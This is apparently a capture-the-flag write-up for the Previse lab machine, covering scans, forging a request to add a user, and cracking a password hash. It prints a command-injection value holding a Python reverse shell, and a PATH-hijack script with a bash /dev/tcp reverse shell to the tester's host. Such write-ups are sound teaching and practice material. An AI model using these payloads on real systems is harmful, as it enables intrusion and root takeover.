# Writeup 
## Recon

### rustscan

```
sudo rustscan -a 10.10.11.104 | tee rustscan.txt
```

```
[~] Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-13 21:15 EDT
Initiating Ping Scan at 21:15
Scanning 10.10.11.104 [4 ports]
Completed Ping Scan at 21:15, 0.15s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 21:15
Completed Parallel DNS resolution of 1 host. at 21:15, 0.04s elapsed
DNS resolution of 1 IPs took 0.04s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating SYN Stealth Scan at 21:15
Scanning 10.10.11.104 [2 ports]
Discovered open port 22/tcp on 10.10.11.104
Discovered open port 80/tcp on 10.10.11.104
Completed SYN Stealth Scan at 21:15, 0.17s elapsed (2 total ports)
Nmap scan report for 10.10.11.104
Host is up, received echo-reply ttl 63 (0.12s latency).
Scanned at 2021-08-13 21:15:51 EDT for 1s

PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.47 seconds
           Raw packets sent: 6 (240B) | Rcvd: 3 (116B)

```

### nmapAutomator

```
sudo nmapAutomator.sh -H 10.10.11.104 -t Recon 
```

- Nmap results

```
# Nmap 7.91 scan initiated Fri Aug 13 21:15:46 2021 as: /usr/bin/nmap -sCV -p22,80 --open -oN nmap/Script_10.10.11.104.nmap --system-dns --stats-every 2s 10.10.11.104
Nmap scan report for 10.10.11.104
Host is up (0.24s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 53:ed:44:40:11:6e:8b:da:69:85:79:c0:81:f2:3a:12 (RSA)
|   256 bc:54:20:ac:17:23:bb:50:20:f4:e1:6e:62:0f:01:b5 (ECDSA)
|_  256 33:c1:89:ea:59:73:b1:78:84:38:a4:21:10:0c:91:d8 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-title: Previse Login
|_Requested resource was login.php
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Aug 13 21:15:57 2021 -- 1 IP address (1 host up) scanned in 11.71 seconds
```

- Ffuf results

```
 :: Method           : GET                                 
 :: URL              : http://10.10.11.104:80/FUZZ         
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt          
 :: Extensions       : .php                                
 :: Follow redirects : false                               
 :: Calibration      : false                               
 :: Timeout          : 10                                  
 :: Threads          : 40                                                                                             
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405                                               
________________________________________________                                                                      
                                                                                                                      
.htpasswd               [Status: 403, Size: 277, Words: 20, Lines: 10]                                                
.hta                    [Status: 403, Size: 277, Words: 20, Lines: 10]                                                
                        [Status: 302, Size: 2801, Words: 737, Lines: 72]                                              
.hta.php                [Status: 403, Size: 277, Words: 20, Lines: 10]                                                
.htaccess.php           [Status: 403, Size: 277, Words: 20, Lines: 10]                                                
.htaccess               [Status: 403, Size: 277, Words: 20, Lines: 10]    
accounts.php            [Status: 302, Size: 3994, Words: 1096, Lines: 94]                                             
.php                    [Status: 403, Size: 277, Words: 20, Lines: 10]                                                
.htpasswd.php           [Status: 403, Size: 277, Words: 20, Lines: 10]
config.php              [Status: 200, Size: 0, Words: 1, Lines: 1]                                                    
css                     [Status: 301, Size: 310, Words: 20, Lines: 10]                                                
download.php            [Status: 302, Size: 0, Words: 1, Lines: 1]                                                    
favicon.ico             [Status: 200, Size: 15406, Words: 15, Lines: 10]                                              
files.php               [Status: 302, Size: 4914, Words: 1531, Lines: 113]
footer.php              [Status: 200, Size: 217, Words: 10, Lines: 6]
header.php              [Status: 200, Size: 980, Words: 183, Lines: 21]    
index.php               [Status: 302, Size: 2801, Words: 737, Lines: 72]                                              
index.php               [Status: 302, Size: 2801, Words: 737, Lines: 72]                                              
js                      [Status: 301, Size: 309, Words: 20, Lines: 10]                                                
login.php               [Status: 200, Size: 2224, Words: 486, Lines: 54]                                              
logs.php                [Status: 302, Size: 0, Words: 1, Lines: 1]                                                    
logout.php              [Status: 302, Size: 0, Words: 1, Lines: 1]                                                    
nav.php                 [Status: 200, Size: 1248, Words: 462, Lines: 32]                                              
server-status           [Status: 403, Size: 277, Words: 20, Lines: 10]                                                
status.php              [Status: 302, Size: 2968, Words: 749, Lines: 75]                                              
:: Progress: [9228/9228] :: Job [1/1] :: 337 req/sec :: Duration: [0:00:30] :: Errors: 0 ::           
```

- Nikto results

```
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.11.104
+ Target Hostname:    10.10.11.104
+ Target Port:        80
+ Start Time:         2021-08-13 21:16:29 (GMT-4)
---------------------------------------------------------------------------
+ Server: Apache/2.4.29 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Cookie PHPSESSID created without the httponly flag
+ Root page / redirects to: login.php
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Apache/2.4.29 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ /config.php: PHP Config file may contain database IDs and passwords.
+ OSVDB-3268: /css/: Directory indexing found.
+ OSVDB-3092: /css/: This might be interesting...
+ OSVDB-3233: /icons/README: Apache default file found.
+ /login.php: Admin login page/section found.
+ 7889 requests: 0 error(s) and 10 item(s) reported on remote host
+ End Time:           2021-08-13 21:34:36 (GMT-4) (1087 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```


## Initial Access

![[37127d4428d48bc9c23421537088b456-1.png]]

![[e2f3cc7aec5006367c530617ba065b30-1.png]]

![[b0ddf17ac0146661d4991fa33ce2dca2-1.png]]

![[a776905d3356b3effd9fb80930781bb6-1.png]]

![[2dfdefec4158e0f83ccd1cfb13e57689-1.png]]

![[9580fe670bd140450c7f02bdc5756572-1.png]]

![[e9e6631ceb1a7fbbe1ebd124b5befee2-1.png]]

![[982f05e5ea6b2f1ccb90a28d999691f0-1.png]]

### Forging a POST request to add a user

- Note: need to specify Content-Type for the parameters to be processed correctly. Make sure there is no newline at the end of the request.

![[8d5d4818bcfb439f8d720aef1098894c-1.png]]

![[599709d27428e5c24f2c83bad590a186-1.png]]

![[8d4c0d9bc3bc968f7ca4f1f11a1bf197-1.png]]

### Webapp exfiltration and analysis

![[668ccc50004f45766645f5ede6b636ed-1.png]]

![[9aa967a43495286e2e3e7c27caeaaef1-1.png]]

- `out.log` contents

![[ea183b914ed1164bc9047d039ae47c31-1.png]]

- `config.php` contents

![[2fc6caca5153e799de209245dde11b01-1.png]]

- `logs.php` contents

![[92d174d30515413eabb1cb112ff50f6a-1.png]]

### Code injection in logs.php for shell

- Quick note: At this point, I had to restart Kali and the VPN interface IP changed from 10.10.14.3 to 10.10.14.14, but the methods are the same...

![[4cb78902713e56875d00174fe02f1437-1.png]]

- Started netcat listener

```
rlwrap nc -nvlp 1337 
```

![[3c711deba05f70a88c6485b4f8f3af41-1.png]]

```
delim=;/usr/bin/python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",1337));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
```

![[674768565a3e3495173b95b6becb3c43-1.png]]

### Escalating privileges by extracting and cracking md5crypt hashes

![[77dd2aaa1bb74be704f20a6630e0b982-1.png]]


- Note: KEEP the salt shaker symbol!!

```
$1$🧂llol$DQpmdvnb7EeuO6UaqRItf.
```

```
hashcat -m 500 -a 0 -o cracked.txt target_hashes.txt /usr/share/wordlists/rockyou.txt  
```

```
$1$🧂llol$DQpmdvnb7EeuO6UaqRItf.:ilovecody112235!
```

- User flag done!

![[6e5274ba3ae8e8f7e78fdbf353bf0e9f-1.png]]



## Privesc

### Exploiting PATH injection for root

![[1440a3ce61113fea783b4ae9a4966c4e-1.png]]

![[6e844e58a3110feecb6d0a622ff23681-1.png]]

```
rlwrap nc -nvlp 31337
```

```
cd /home/m4lwhere
echo "bash -i >& /dev/tcp/10.10.14.14/31337 0>&1;" > gzip
chmod +x gzip
export PATH=$(pwd):$PATH
sudo /opt/scripts/access_backup.sh 
```

![[d530b3bc8cebbf7781c0c0f11d7e1211-1.png]]